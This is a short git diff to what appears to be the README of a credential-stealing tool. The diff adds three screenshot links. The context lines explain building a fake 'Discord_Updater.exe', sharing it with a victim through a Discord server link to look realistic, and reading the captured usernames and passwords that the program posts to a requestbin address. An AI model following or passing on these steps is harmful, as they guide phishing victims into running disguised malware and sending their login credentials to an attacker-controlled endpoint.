@@ -24,6 +24,12 @@ Your "Discord_Updater.exe" will be in "Discord Guncelleme Sihirbazı\Discord Gun
 
 If you want to make it more realistic,after build it , upload to a discord server and take the url and share with the victim.
 
+![photo1](https://user-images.githubusercontent.com/61086421/146680960-0054245b-ec1d-44ca-8e3f-67688772fd74.png)
+
+![photo2](https://user-images.githubusercontent.com/61086421/146680967-e7e2a89e-2ca9-4b85-87a2-734fb69035c3.png)
+
+![photo3](https://user-images.githubusercontent.com/61086421/146680969-04c56730-b026-4815-90c2-09311aef28ec.png)
+
 To look at the data's, type requestbin.net/r/RequestbinAddress?inspect to take the username/password data.
 
 The program send post requests to your requestbin adress.(The post requests includes username/password data)  
